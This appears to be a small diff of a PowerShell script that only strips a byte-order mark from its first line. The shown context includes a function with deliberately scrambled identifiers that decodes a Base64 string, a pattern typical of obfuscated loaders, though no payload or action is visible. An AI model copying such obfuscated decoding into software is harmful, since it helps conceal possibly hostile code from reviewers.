@@ -1,4 +1,4 @@
-﻿Set-StrictMode -Off
+Set-StrictMode -Off
 
 function z($5VAUPX0,$8UNyT,$C1A = $false){
     $CwgmejzO9vBEoiVkc3WIdxT7S = [System.Convert]::FromBase64String($5VAUPX0)
